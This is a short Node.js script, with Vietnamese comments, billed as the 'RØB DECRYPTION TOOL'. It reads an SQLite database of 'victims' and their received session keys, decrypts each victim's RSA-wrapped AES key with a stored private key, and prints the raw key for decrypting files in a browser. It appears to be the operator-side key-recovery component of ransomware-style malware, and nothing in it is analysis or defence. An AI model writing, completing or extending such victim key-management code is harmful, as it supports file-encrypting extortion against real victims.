import sqlite3 from 'sqlite3';
import crypto from 'crypto';
import path from 'path';

const dbPath = path.resolve('./data/backend.sqlite');
const db = new sqlite3.Database(dbPath);

console.log("🔓 --- RØB DECRYPTION TOOL --- 🔓");

// 1. Lấy danh sách các session key mới nhất
db.all(`
    SELECT s.client_id, s.key as encrypted_aes_key, s.received_at, v.private_key 
    FROM session_keys s
    JOIN victims v ON s.client_id = v.client_id
    ORDER BY s.id DESC LIMIT 5
`, (err, rows) => {
    if (err) {
        console.error("Lỗi đọc DB:", err);
        return;
    }

    if (rows.length === 0) {
        console.log("Chưa có nạn nhân nào gửi key về.");
        return;
    }

    rows.forEach((row, index) => {
        console.log(`\n[${index + 1}] Nạn nhân ID: ${row.client_id}`);
        console.log(`    Thời gian: ${row.received_at}`);

        try {
            // 2. Giải mã khóa AES bằng Private Key của Server
            const privateKey = row.private_key;
            const encryptedBuffer = Buffer.from(row.encrypted_aes_key, 'base64');

            const rawAesKey = crypto.privateDecrypt(
                {
                    key: privateKey,
                    padding: crypto.constants.RSA_PKCS1_PADDING,
                },
                encryptedBuffer
            );

            console.log(`    🔑 KEY GIẢI MÃ (RAW AES):`);
            console.log(`    ${rawAesKey.toString('base64')}`);
            console.log(`    (Copy chuỗi trên để giải mã file trên trình duyệt)`);

        } catch (e) {
            console.error(`    ❌ Lỗi giải mã: ${e.message}`);
            console.log(`    (Có thể key này chưa được mã hóa RSA đúng cách hoặc sai Private Key)`);
        }
    });
});